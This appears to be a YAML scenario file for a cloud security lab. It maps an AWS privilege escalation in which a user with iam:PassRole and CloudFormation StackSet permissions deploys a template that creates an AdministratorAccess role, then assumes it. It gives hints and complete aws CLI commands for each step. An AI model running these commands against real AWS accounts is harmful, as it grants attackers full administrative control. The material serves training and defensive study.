attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-003-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the privileged execution role, cloudformation:CreateStackSet,
        and cloudformation:CreateStackInstances permissions. These combined permissions allow you to
        deploy a CloudFormation StackSet that creates IAM resources with any permissions you define.

    - id: stackset
      label: "CloudFormation StackSet"
      type: resource
      subType: cloudformation-stack
      arn: "arn:aws:cloudformation:{region}:{account_id}:stackset/pl-prod-cloudformation-003-escalation-stackset:*"
      description: >
        A CloudFormation StackSet you create using the starting user's permissions. The StackSet is
        configured to use the privileged execution role (passed via iam:PassRole) to perform resource
        creation. When you deploy a stack instance from this StackSet, CloudFormation assumes the
        execution role and creates the IAM resources defined in your template.

    - id: escalated-role
      label: "Escalated Admin Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-003-to-admin-escalated-role"
      description: >
        An IAM role created by the CloudFormation StackSet using the privileged execution role's permissions.
        The template you provided defines this role with AdministratorAccess and a trust policy allowing
        the starting user to assume it. Once the stack instance completes successfully, you can assume
        this role to gain full administrative access to the AWS account.

  edges:
    - from: starting-user
      to: stackset
      label: "iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances"
      description: >
        Create a CloudFormation StackSet passing the privileged execution role, then deploy a stack
        instance. CloudFormation assumes the execution role and creates the IAM resources defined in
        the template, including the escalated admin role.
      hints:
        - "You have permissions related to CloudFormation and IAM role passing -- look at what roles are available to you with iam:ListRoles."
        - "Use iam:GetRole on roles with 'cloudformation-003' in their name to check what policies are attached to the execution role."
        - "CloudFormation StackSets use an execution role to perform the actual resource creation -- if you can pass a role with AdministratorAccess, CloudFormation will act with those permissions."
        - "Craft a CloudFormation template that creates an IAM role with AdministratorAccess and a trust policy granting your starting user sts:AssumeRole on it."
        - "Create the StackSet using cloudformation:CreateStackSet, specifying the execution role name via the --execution-role-name parameter. Then deploy a stack instance with cloudformation:CreateStackInstances to trigger the resource creation."
        - "Monitor the operation progress using cloudformation:DescribeStackSetOperation until the status reaches SUCCEEDED."
        - "Browse to https://pathfinding.cloud/paths/cloudformation-003 for technique details."
      commands:
        - description: "Create a CloudFormation template defining an escalated admin role"
          command: |
            cat > /tmp/escalation-template.yaml << 'EOF'
            AWSTemplateFormatVersion: '2010-09-09'
            Resources:
              EscalatedRole:
                Type: AWS::IAM::Role
                Properties:
                  RoleName: pl-prod-cloudformation-003-to-admin-escalated-role
                  AssumeRolePolicyDocument:
                    Version: '2012-10-17'
                    Statement:
                      - Effect: Allow
                        Principal:
                          AWS: arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-003-to-admin-starting-user
                        Action: sts:AssumeRole
                  ManagedPolicyArns:
                    - arn:aws:iam::aws:policy/AdministratorAccess
            EOF
        - description: "Create the StackSet passing the privileged execution role"
          command: "aws cloudformation create-stack-set --stack-set-name pl-prod-cloudformation-003-escalation-stackset --template-body file:///tmp/escalation-template.yaml --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-admin-role --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role --capabilities CAPABILITY_NAMED_IAM"
        - description: "Deploy a stack instance to create the escalated role"
          command: "aws cloudformation create-stack-instances --stack-set-name pl-prod-cloudformation-003-escalation-stackset --accounts ACCOUNT_ID --regions us-east-1 --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1 --query 'OperationId' --output text"
        - description: "Wait for the stack instance operation to complete"
          command: "aws cloudformation describe-stack-set-operation --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id OPERATION_ID --query 'StackSetOperation.Status' --output text"

    - from: stackset
      to: escalated-role
      label: "sts:AssumeRole"
      description: >
        Once the StackSet operation completes, assume the newly created escalated role to gain
        full administrative access to the AWS account.
      hints:
        - "Once the StackSet operation status shows SUCCEEDED, the IAM role defined in your template has been created -- use iam:GetRole to confirm it exists."
        - "The newly created role has a trust policy allowing your starting user to assume it -- you already have sts:AssumeRole permission."
        - "Assume the escalated role and export the returned session credentials to verify you now have administrative access."
      commands:
        - description: "Assume the escalated admin role"
          command: "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-escalated-role --role-session-name escalation-session --query 'Credentials' --output json"
        - description: "Verify administrative access"
          command: "aws iam list-users --max-items 3 --output table"
